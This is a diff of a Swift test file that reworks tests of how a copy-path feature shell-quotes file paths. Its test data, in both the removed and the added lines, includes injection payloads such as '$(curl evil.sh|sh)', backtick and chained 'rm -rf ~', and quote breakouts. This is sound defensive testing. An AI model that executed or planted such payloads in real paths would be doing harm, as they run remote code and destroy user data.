@@ -52,76 +52,28 @@ public struct CopyPathTests {
         return inner.replacingOccurrences(of: "'\\''", with: "'")
     }
 
-    /// Regression coverage for the `.terminalEscaped` copy variant: a path copied for pasting as an
-    /// **unquoted** shell token routes through `escapeForTerminal`. The property under test — that
-    /// `escapeForTerminal` neutralizes command-injection payloads when embedded in `cd "..."` — is
-    /// fully testable here.
+    /// Regression coverage for the `.terminalEscaped` copy variant: the copied string is a single
+    /// POSIX-quoted token, so every shell metacharacter, `~`, and embedded newline is inert and the
+    /// path round-trips exactly when the shell unquotes it.
     private static func testShellInjectionPayloadsNeutralized() {
-        // Command substitution via $(...)
-        let cmdSubst = "$(curl evil.sh|sh)"
-        assertNeutralizedWhenQuoted(cmdSubst, description: "$(...) command substitution")
-
-        // Command substitution via backticks
-        let backticks = "`rm -rf ~`"
-        assertNeutralizedWhenQuoted(backticks, description: "backtick command substitution")
-
-        // Attempted double-quote breakout followed by a chained destructive command
-        let quoteBreakout = "\"; rm -rf ~; echo \""
-        assertNeutralizedWhenQuoted(quoteBreakout, description: "double-quote breakout with chained command")
-
-        // Attempted quote breakout via an escaped double quote plus a comment to swallow the rest
-        let escapedQuoteBreakout = "\\\"; touch /tmp/pwned #"
-        assertNeutralizedWhenQuoted(escapedQuoteBreakout, description: "backslash+quote breakout with trailing comment")
-
-        // Semicolon-chained command with no quotes at all
-        let chained = "; touch /tmp/pwned ;"
-        assertNeutralizedWhenQuoted(chained, description: "semicolon-chained command")
-
-        // Sanity: an ordinary path is left semantically intact (still equal once unescaped)
-        let benign = "/Users/test/Documents/My Folder"
-        let benignEscaped = CopyPathService.escapeForTerminal(benign)
-        TestReporter.report(
-            "CopyPath",
-            "POS: escapeForTerminal leaves a benign path's characters intact aside from added escapes",
-            result: benignEscaped.replacingOccurrences(of: "\\", with: "") == benign)
-    }
-
-    /// Simulates the real call site (`cd "\(escapeForTerminal(path))"`) and asserts the resulting
-    /// double-quoted shell string contains no unescaped `"`, `$`, or backtick that could break out
-    /// of the quotes or trigger command/variable substitution.
-    private static func isSpecialShellChar(_ char: Character) -> Bool {
-        char == "\"" || char == "$" || char == "`"
-    }
-
-    private static func assertNeutralizedWhenQuoted(_ payload: String, description: String) {
-        let escaped = CopyPathService.escapeForTerminal(payload)
-        let shellCommand = "cd \"\(escaped)\""
-
-        // Walk the command string; every `"`, `$`, or backtick found must be immediately
-        // preceded by a backslash, EXCEPT the two literal quotes we added to open/close the cd
-        // argument.
-        var passed = true
-        let chars = Array(shellCommand)
-        var quoteCount = 0
-        for (index, char) in chars.enumerated() {
-            guard isSpecialShellChar(char) else { continue }
-            let escapedByPriorBackslash = index > 0 && chars[index - 1] == "\\"
-            if char == "\"" {
-                quoteCount += 1
-                // The 1st and last quote in the whole command are the ones we deliberately added.
-                let isDeliberateBoundaryQuote = (quoteCount == 1) || (index == chars.count - 1)
-                if !isDeliberateBoundaryQuote, !escapedByPriorBackslash {
-                    passed = false
-                }
-            } else if !escapedByPriorBackslash {
-                passed = false
-            }
+        let payloads = [
+            "/tmp/$(curl evil.sh|sh)",
+            "/tmp/`rm -rf ~`",
+            "/tmp/\"; rm -rf ~; echo \"",
+            "/tmp/; touch /tmp/pwned ;",
+            "/tmp/~root/secret",
+            "/tmp/line one\nrm -rf ~"
+        ]
+        for payload in payloads {
+            let url = URL(fileURLWithPath: payload)
+            let expectedPath = url.standardizedFileURL.path
+            let quoted = CopyPathService.format(url: url, variant: .terminalEscaped)
+            let recovered = unwrapSingleQuoted(quoted)
+            TestReporter.report(
+                "CopyPath",
+                "NEG: terminalEscaped single-quotes an injection/~/newline payload so it stays a literal path (\(payload.replacingOccurrences(of: "\n", with: "\\n")))",
+                result: quoted.hasPrefix("'") && quoted.hasSuffix("'") && recovered == expectedPath)
         }
-
-        TestReporter.report(
-            "CopyPath",
-            "NEG: escapeForTerminal neutralizes injection payload when embedded in cd \"...\" (\(description))",
-            result: passed)
     }
 
     private static func testFormattingVariants(baseDir: URL, targetFile: URL) {
@@ -140,10 +92,12 @@ public struct CopyPathTests {
             "POS: File URL formatting",
             result: fileURL == "file:///Users/test/Documents/My%20Folder/file%20(1).txt" || fileURL.contains("file:///"))
 
-        // POS: Terminal Escaped Path Format
+        // POS: Terminal Escaped Path Format — a single POSIX-quoted token
         let escaped = CopyPathService.format(url: targetFile, variant: .terminalEscaped, relativeTo: baseDir)
-        let containsBackslashes = escaped.contains("My\\ Folder") && escaped.contains("file\\ \\(1\\).txt")
-        TestReporter.report("CopyPath", "POS: Terminal escaped formatting", result: containsBackslashes)
+        TestReporter.report(
+            "CopyPath",
+            "POS: Terminal escaped formatting wraps the path in single quotes",
+            result: escaped == "'/Users/test/Documents/My Folder/file (1).txt'")
 
         // POS: fileURL formatting percent-encodes spaces and parentheses
         let fileURLEncoded = CopyPathService.format(url: targetFile, variant: .fileURL, relativeTo: baseDir)
@@ -152,15 +106,13 @@ public struct CopyPathTests {
             "POS: fileURL formatting percent-encodes spaces and parentheses",
             result: fileURLEncoded == "file:///Users/test/Documents/My%20Folder/file%20(1).txt")
 
-        // POS: terminalEscaped escapes a broad set of shell-special characters
-        let shellSpecial = URL(fileURLWithPath: "/tmp/a&b;c|d$e*f?g<h>i#j!k`l'm\"n.txt")
-        let shellEscaped = CopyPathService.escapeForTerminal(shellSpecial.standardizedFileURL.path)
-        let allEscaped = ["&", ";", "|", "$", "*", "?", "<", ">", "#", "!", "`", "'", "\""].allSatisfy { shellEscaped.contains("\\" + $0) }
-        TestReporter.report("CopyPath", "POS: terminalEscaped escapes shell-special characters", result: allEscaped)
-
-        // POS: terminalEscaped escapes literal backslashes without double-escaping subsequent chars
-        let backslashEscaped = CopyPathService.escapeForTerminal("a\\b c")
-        TestReporter.report("CopyPath", "POS: terminalEscaped escapes literal backslashes", result: backslashEscaped == "a\\\\b\\ c")
+        // POS: terminalEscaped keeps an embedded apostrophe literal via the '\'' sequence
+        let apostrophe = URL(fileURLWithPath: "/tmp/O'Brien.txt")
+        let apostropheEscaped = CopyPathService.format(url: apostrophe, variant: .terminalEscaped)
+        TestReporter.report(
+            "CopyPath",
+            "POS: terminalEscaped encodes an embedded apostrophe as '\\''",
+            result: apostropheEscaped == "'/tmp/O'\\''Brien.txt'")
     }
 
     private static func testRelativePath(baseDir: URL, targetFile: URL) {
